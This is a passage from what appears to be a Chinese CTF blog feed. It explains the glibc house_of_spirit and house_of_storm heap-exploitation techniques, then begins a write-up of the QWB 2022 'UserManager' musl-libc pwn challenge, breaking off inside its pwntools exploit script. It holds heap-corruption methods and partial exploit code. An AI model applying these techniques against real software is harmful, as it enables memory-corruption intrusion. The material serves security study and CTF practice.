    <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">        (<span class="type">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">      malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>检查size是否过小以及size是否对齐，即size不能小于0x20且在x64中也要是0x8对齐，否则报错中止。源码如下：</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>检查下一个chunk的大小，不能小于<code>2 * SIZE_SZ</code>（即0x10），也不能大于<code>av-&gt;system_mem</code>（应该是一个很大的值），源码如下：</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">   of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">   after getting the lock.  */</span></span><br><span class="line"><span class="keyword">if</span> (have_lock</span><br><span class="line">    || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">  mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">  locked = <span class="number">1</span>;</span><br><span class="line">  chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">      &#125;))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">if</span> (! have_lock)</span><br><span class="line">  &#123;</span><br><span class="line">    (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    locked = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>检查fastbin的第一个chunk是否是当前释放的chunk，防止double free。源码如下：</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">   (i.e., double free).  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">   size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">   only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">   deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line"><span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">  old_idx = fastbin_index(chunksize(old));</span><br><span class="line">p-&gt;fd = old2 = old;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br></pre></td></tr></table></figure><p>在house_of_spirit中，第2个检查一般都是满足的，绕过第1个检查需要将目标地址看做一个chunk，对应size的地址处应该写入一个0x20~0x80且能够被0x8整除的数，以绕过第1, 3个检查。第4个检查的绕过需要一些小技巧。假设在目标地址处我们可以控制0x60的空间，那么我们的size不应该写成0x60而是小于0x60，这样方便我们在后面伪造next chunk的size。第5个检查一般没有问题。</p><p>所有这些工作做好之后，就可以先释放再分配了。分配完成后就可以在目标地址处获取一个chunk。一般来说house_of_spirit是作为跳板来使用的，在目标地址获取chunk能够很好地为其他攻击手段做准备。</p><h1 id="11-house-of-storm"><a href="#11-house-of-storm" class="headerlink" title="11. house_of_storm"></a>11. house_of_storm</h1><p>关于此利用方式，源码中的说明是可以向用户返回任意一个chunk。</p><p>首先，程序分配了两个chunk，一个进入unsorted bin，一个进入large bins，且unsorted bin中的chunk大小大于large bins中的chunk。在源码中，unsorted bin chunk的大小设定为0x4f0，同时分配一个小chunk防止其在释放时与top chunk合并。</p><p>之后，源码中以这个chunk的最高非0字节为参考，计算了需要分配的chunk的大小。将最低1bit置0（因为这里在chunk的size中代表的是prev_in_use标志位），这里需要进行检查：最低1字节的bit-3不能为1，若bit-2为1则bit-1不能为0，至于原因，后面会提到。</p><p>如果上述检查通过，则进行接下来的操作。分配一个大小为0x4e0的chunk，再加上一个小chunk防止与top chunk合并。之后释放0x4e0大小的chunk和0x4f0大小的chunk（这里注意要首先释放较小的chunk），然后分配一个0x4f0大小的chunk。这样由于<font color=red><strong>unsorted bin在malloc时遵循先进先出的队列结构</strong></font>，会首先检查到小chunk，而小chunk大小不足，会被链入到large bins中。然后再将0x4f0大小的chunk释放，返还到unsorted bin中，bins的环境就构造完成了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x603000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603000</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x4c0: 0x603510 —▸ 0x7ffff7dd1f98 (main_arena+1144) ◂— 0x603510</span><br></pre></td></tr></table></figure><p>然后，我们需要使用unsorted bin attack，覆盖unsorted bin chunk的bk指针为(目标地址 - 0x10)处，覆盖large bin chunk的bk指针到(目标地址 - 0x8)处，覆盖large bin chunk的bk_nextsize。之后，malloc即可获取目标地址的chunk。</p><p>但是，为什么会这样呢？这需要从_int_malloc函数中寻找答案。</p><h2 id="本漏洞利用中-int-malloc函数中重要步骤："><a href="#本漏洞利用中-int-malloc函数中重要步骤：" class="headerlink" title="本漏洞利用中_int_malloc函数中重要步骤："></a>本漏洞利用中_int_malloc函数中重要步骤：</h2><p>参考博客（有分析全过程）：<a href="https://blog.csdn.net/qq_41453285/article/details/99005759?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164652688616780265470085%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164652688616780265470085&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-99005759.pc_search_result_control_group&utm_term=int_malloc&spm=1018.2226.3001.4187">_int_malloc函数详解</a></p><ol><li><p>如果申请大小在fastbin范围则从fastbin中查找是否有合适的chunk。</p></li><li><p>如果申请大小在small bins范围则从small bins中查找是否有合适的chunk。</p></li><li><p>前2步没有找到调用malloc_consolidate函数整理堆块</p></li><li><p>大循环：</p><p> (1) 从unsorted bin中获取当前遍历到的chunk<br> (2) 如果申请大小在small bins范围且last remainder可以切割一部分给申请堆块，则切割后返回<br> (3) 如果申请大小正好等于当前遍历到chunk的大小，则直接返回</p> <font color=red> (4) 将当前unsorted bin chunk放入small bins或large bins中： 如果当前遍历到的unsorted bin chunk的大小属于small bins范围则放入对应的small bin中。 如果属于large bins范围，则需要进行一些处理： 因为large bins中的每一个bin里面的chunk大小均是一个范围值而不是固定值，所以libc会对每一个large bin中的chunk按照大小进行排序，large bin chunk的fd和bk指针指向前后chunk，而fd_nextsize和bk_nextsize指向前后第一个与该chunk大小不同的chunk，便于遍历。所以，libc会遍历该large bin并将这个原本在unsorted bin中的chunk放入正确的位置。在house of storm中，至关重要的就是下面的入链操作： </font></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;fd_nextsize = fwd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;bk_nextsize = victim;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure><p>这里要尤其注意第4条语句，这是唯一一条修改目标地址值的语句。<br>（victim &#x3D; unsorted bin chunk，fwd &#x3D; large bin chunk）</p><p>在此之前，分别位于unsorted bin和large bins的两个chunk的构造如下：</p><p>unsorted bin chunk:</p><table><thead><tr><th align="center">addr</th><th align="center">+0x0</th><th align="center">+0x8</th></tr></thead><tbody><tr><td align="center">0x603000</td><td align="center">0</td><td align="center">0x4f1(size)</td></tr><tr><td align="center">0x603010</td><td align="center">main_arena + 0x68</td><td align="center">target-0x10</td></tr><tr><td align="center">0x603020</td><td align="center">0</td><td align="center">0</td></tr></tbody></table><p>large bin chunk:</p><table><thead><tr><th align="center">addr</th><th align="center">+0x0</th><th align="center">+0x8</th></tr></thead><tbody><tr><td align="center">0x603510</td><td align="center">0</td><td align="center">0x4e1(size)</td></tr><tr><td align="center">0x603520</td><td align="center">main_arena + 1144</td><td align="center">target-0x8</td></tr><tr><td align="center">0x603530</td><td align="center">0x603510(fd_nextsize)</td><td align="center">target-0x2a(bk_nextsize)</td></tr></tbody></table><p>在执行完上述4步之后，结构变为：</p><p>unsorted bin chunk:</p><table><thead><tr><th align="center">addr</th><th align="center">+0x0</th><th align="center">+0x8</th></tr></thead><tbody><tr><td align="center">0x603000</td><td align="center">0</td><td align="center">0x4f1(size)</td></tr><tr><td align="center">0x603010</td><td align="center">main_arena + 0x68</td><td align="center">target-0x8</td></tr><tr><td align="center">0x603020</td><td align="center"><font color=red>0x603510</font></td><td align="center"><font color=red>target-0x2a</font></td></tr></tbody></table><p>large bin chunk:</p><table><thead><tr><th align="center">addr</th><th align="center">+0x0</th><th align="center">+0x8</th></tr></thead><tbody><tr><td align="center">0x603510</td><td align="center">0</td><td align="center">0x4e1(size)</td></tr><tr><td align="center">0x603520</td><td align="center">main_arena + 1144</td><td align="center">target-0x8</td></tr><tr><td align="center">0x603530</td><td align="center">0x603510</td><td align="center"><font color=red>0x603000</font></td></tr></tbody></table><p>同时(target-0x2a)-&gt;fd_nextsize被写入为0x603000，也即target-0xa处被写入为0x603000：</p><table><thead><tr><th align="center">addr</th><th align="center">0</th><th align="center">1</th><th align="center">2</th><th align="center">3</th><th align="center">4</th><th align="center">5</th><th align="center">6</th><th align="center">7</th></tr></thead><tbody><tr><td align="center">target-0x10</td><td align="center">–</td><td align="center">–</td><td align="center">–</td><td align="center">–</td><td align="center">–</td><td align="center">–</td><td align="center"><font color=red>00</font></td><td align="center"><font color=red>30</font></td></tr><tr><td align="center">target-0x8</td><td align="center"><font color=red>60</font></td><td align="center">00</td><td align="center">00</td><td align="center">00</td><td align="center">00</td><td align="center">00</td><td align="center">00</td><td align="center">00</td></tr><tr><td align="center">target</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">target+0x8</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><p>如果将target-0x10看做chunk头，那么这里正好写入了一个正确的size，即0x60！这也就能够解释为什么源代码一开始要将unsorted bin chunk地址的高位作为size，且需要通过一系列检查了。通过了一系列检查，然后像这样错位写入，就正好能够伪造正确的size！这样，_int_malloc函数就能够为我们返回这个地方的地址了。</p><p>对于这个漏洞的利用的理解需要对_int_malloc函数有充分的理解，利用unsorted bin chunk被链入到large bins的过程对堆结构进行攻击。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>强网杯2022 pwn 赛题解析——UserManager</title>
      <link href="/2023/02/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2022-pwn-%E8%B5%9B%E9%A2%98%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94UserManager/"/>
      <url>/2023/02/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2022-pwn-%E8%B5%9B%E9%A2%98%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94UserManager/</url>
      
        <content type="html"><![CDATA[<p>刚刚结束的2022年强网杯中有一道题用到了musl libc，但是之前没有接触过，只能遗憾跳过。本文根据musl libc 1.2.2的源码，和赛题本身，学习一下musl libc的利用方式。</p><p>musl libc 是一种轻量级的libc，可以用于嵌入式设备等，其中包含malloc、free等一系列函数的实现都与glibc相差甚远。但由于其轻量化的定位，其实现的代码量也相对较少，便于我们通过源码进行直接分析。</p><p>本文主要参考资料：<a href="https://bbs.pediy.com/thread-269533.htm">资料</a></p><h1 id="UserManager"><a href="#UserManager" class="headerlink" title="UserManager"></a>UserManager</h1><p>本题的musl版本是1.2.2，在新版的Ubuntu 22.04中下载的musl默认版本为1.2.2-4。</p><h2 id="1-逆向分析程序"><a href="#1-逆向分析程序" class="headerlink" title="1. 逆向分析程序"></a>1. 逆向分析程序</h2><p>用IDA打开之后，发现其中的符号表大多还在，省去了重命名函数的时间。在Menu函数中，我们可以得知这个程序能够实现的功能有：Add、Check、Delete、Clear。下面依次进行分析。</p><h3 id="主要数据结构"><a href="#主要数据结构" class="headerlink" title="主要数据结构"></a>主要数据结构</h3><p>本题中涉及的数据结构是红黑树。结构体定义如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">00000000 chunk_info      struc ; (sizeof=0x38, mappedto_6)</span><br><span class="line">00000000 Id              dq ?</span><br><span class="line">00000008 name_chunk      dq ?                    ; offset</span><br><span class="line">00000010 name_len        dq ?</span><br><span class="line">00000018 color           dq ?                    ; enum node_type</span><br><span class="line">00000020 parent          dq ?                    ; offset</span><br><span class="line">00000028 right_child     dq ?                    ; offset</span><br><span class="line">00000030 left_child      dq ?                    ; offset</span><br><span class="line">00000038 chunk_info      ends</span><br><span class="line"></span><br><span class="line">FFFFFFFF ; enum node_type, mappedto_8, width 8 bytes</span><br><span class="line">FFFFFFFF red              = 1</span><br><span class="line">FFFFFFFF black            = 2</span><br></pre></td></tr></table></figure><p>那么在初次逆向程序时，我们应该如何得知本题的数据结构是红黑树呢？其重点就在于字段<code>color</code>功能的判断。在<code>insert</code>函数、<code>doing</code>函数、<code>delete</code>函数中，只有当<code>color</code>表示红黑树中结点的颜色时才能将程序的逻辑解释清楚。这需要一定的直觉与经验，也对我们的逆向能力做出了一定的要求。</p><h3 id="Add函数"><a href="#Add函数" class="headerlink" title="Add函数"></a><code>Add</code>函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 name_len; <span class="comment">// rsi</span></span><br><span class="line">  __int64 id; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *name_chunk; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  chunk_info *chunk; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Id: &quot;</span>);</span><br><span class="line">  id = ReadInt();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;UserName length: &quot;</span>);</span><br><span class="line">  name_len = ReadInt();</span><br><span class="line">  name_chunk = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, name_len);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;UserName: &quot;</span>);</span><br><span class="line">  ReadLine(name_chunk, name_len);</span><br><span class="line">  chunk = (chunk_info *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">0x38</span>uLL);</span><br><span class="line">  chunk-&gt;Id = id;</span><br><span class="line">  chunk-&gt;name_chunk = name_chunk;</span><br><span class="line">  chunk-&gt;name_len = name_len;</span><br><span class="line">  chunk-&gt;color = red;</span><br><span class="line">  <span class="keyword">if</span> ( users )</span><br><span class="line">  &#123;</span><br><span class="line">    insert(chunk, users);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    users = chunk;</span><br><span class="line">    chunk-&gt;parent = (chunk_info *)<span class="number">0xDEADBEEF</span>LL;</span><br><span class="line">    chunk-&gt;color = black;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Add ok......\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>insert</code>函数就是向红黑树中插入结点的函数。这个红黑树是按照<code>Id</code>字段进行排序的，<code>Id</code>大的结点位于左边。在<code>insert</code>函数中又调用了<code>doing</code>函数，这个函数主要是用于插入结点后的红黑树调整，其中<code>sini</code>函数的功能是树结点旋转——将参数结点与其父节点顺时针旋转（参数结点是其父节点的左子节点），<code>dext</code>函数的功能是树结点旋转——将参数结点与其父节点逆时针旋转（参数结点是其父节点的右子节点）。后面的<code>delete</code>函数包含了所有红黑树的删除操作，漏洞点不在那里，故不做分析。</p><h3 id="Check函数"><a href="#Check函数" class="headerlink" title="Check函数"></a><code>Check</code>函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">check</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 Int; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 *v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Id: &quot;</span>);</span><br><span class="line">  Int = ReadInt();</span><br><span class="line">  v2 = find(Int, (<span class="type">unsigned</span> __int64 *)users);</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">    <span class="keyword">return</span> write(<span class="number">1</span>, (<span class="type">const</span> <span class="type">void</span> *)v2[<span class="number">1</span>], v2[<span class="number">2</span>]);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;This user is not exists!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是检查某个用户是否存在，如果存在则会输出用户名。</p><h3 id="Insert函数"><a href="#Insert函数" class="headerlink" title="Insert函数"></a><code>Insert</code>函数</h3><p>本题的漏洞点在于<code>insert</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">insert</span><span class="params">(chunk_info *victim, chunk_info *base)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> ( base )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( victim-&gt;Id == base-&gt;Id )<span class="comment">// 如果要插入的victim的Id与base相等，则使用victim替换base，并将原来的base释放</span></span><br><span class="line">    &#123;</span><br><span class="line">      victim-&gt;color = base-&gt;color;</span><br><span class="line">      victim-&gt;right_child = base-&gt;right_child;</span><br><span class="line">      victim-&gt;left_child = base-&gt;left_child;</span><br><span class="line">      victim-&gt;parent = base-&gt;parent;</span><br><span class="line">      <span class="keyword">if</span> ( base-&gt;right_child )</span><br><span class="line">        base-&gt;right_child-&gt;parent = victim;</span><br><span class="line">      <span class="keyword">if</span> ( base-&gt;left_child )</span><br><span class="line">        base-&gt;left_child-&gt;parent = victim;</span><br><span class="line">      <span class="keyword">if</span> ( base-&gt;parent != (chunk_info *)<span class="number">0xDEADBEEF</span>LL )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( base == base-&gt;parent-&gt;right_child )</span><br><span class="line">          base-&gt;parent-&gt;right_child = victim;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          base-&gt;parent-&gt;left_child = victim;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">free</span>(base-&gt;name_chunk);</span><br><span class="line">      <span class="built_in">free</span>(base);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( victim-&gt;Id &gt;= base-&gt;Id )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !base-&gt;left_child )</span><br><span class="line">      &#123;</span><br><span class="line">        victim-&gt;parent = base;</span><br><span class="line">        base-&gt;left_child = victim;</span><br><span class="line">        doing(victim);</span><br><span class="line">        <span class="keyword">if</span> ( !victim-&gt;right_child &amp;&amp; !victim-&gt;left_child )</span><br><span class="line">          base-&gt;color = black;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      base = base-&gt;left_child;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !base-&gt;right_child )</span><br><span class="line">      &#123;</span><br><span class="line">        base-&gt;right_child = victim;</span><br><span class="line">        victim-&gt;parent = base;</span><br><span class="line">        <span class="keyword">if</span> ( victim-&gt;color == red )</span><br><span class="line">          doing(victim);</span><br><span class="line">        <span class="keyword">if</span> ( !victim-&gt;right_child &amp;&amp; !victim-&gt;left_child )</span><br><span class="line">          victim-&gt;color = black;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      base = base-&gt;right_child;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意当两次插入的<code>Id</code>相等时，会将原红黑树中对应的结点替换并释放。但如果原红黑树中被替换的结点是根节点，那么表示根节点的<code>users</code>指针就并不会改变。并且，根节点的释放是在分配新结点之后，因此我们通过分配新的结点就很有可能分配到根节点的结构体本身，这样也就能够对根节点的所有字段进行任意修改了。</p><h2 id="2-漏洞分析与利用"><a href="#2-漏洞分析与利用" class="headerlink" title="2. 漏洞分析与利用"></a>2. 漏洞分析与利用</h2><h3 id="Step-1-获取elf加载基地址"><a href="#Step-1-获取elf加载基地址" class="headerlink" title="Step 1: 获取elf加载基地址"></a>Step 1: 获取elf加载基地址</h3><p>首先，我们需要知道应该如何才能分配到根节点chunk，这就涉及musl libc中的堆结构管理了。在musl libc中，相同大小的chunk被归为一个group中进行管理，一个group中只能存放有限个数的chunk，一个group有一个对应的meta进行管理。<strong>与glibc不同的是，musl中被释放的chunk在下一次相同申请大小的malloc时不一定会被分配，只有当group中找不到空闲的chunk时才会使用已经被释放的chunk</strong>。因此这需要我们对group进行填充。</p><p>本题中我们首先需要利用UAF漏洞获取到musl libc的基地址，但几乎所有的chunk都位于堆中，我们无法直接获取到libc中的地址。因此，我们需要首先泄露程序本身的加载地址。通过调试发现，存放meta等结构的内存空间紧邻程序内存，且在其上方的位置，所以我们可以首先通过泄露堆地址获取到程序加载地址：</p><p>在每一次<code>add</code>时，程序都会<code>calloc</code>一个大小为0x38的chunk，实际的分配大小为<code>0x40</code>。经过调试（调试方法参见<a href="https://bbs.pediy.com/thread-269533.htm">资料</a>）发现，管理chunk大小为0x40的group的容量为7，即最多只能容纳7个chunk。因此我们可以考虑首先分配掉5个chunk，然后分配根节点，并使其保存name的chunk也分配到这个group中，通过<code>add</code>相同<code>Id</code>的<code>user</code>让其释放，此时只有原根节点的<code>name</code>这个chunk被释放了，因为相同<code>Id</code>的结构体占用了原根节点的结构体空间，当我们再一次<code>add</code>时，这个chunk就会被用作<code>user</code>结构体，我们通过<code>check</code>就能够读取到其中的一些指针值。</p><p><img src="https://img-blog.csdnimg.cn/ada7660ee3e34bf58804c88b11805ceb.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    add(i, <span class="number">0x78</span>, p64(i + <span class="number">0xdeadbeef00</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x38</span>, p64(<span class="number">11</span> + <span class="number">0xdeadbeef00</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x78</span>, p64(<span class="number">11</span> + <span class="number">0xdeadbeef00</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x78</span>, p64(<span class="number">9</span> + <span 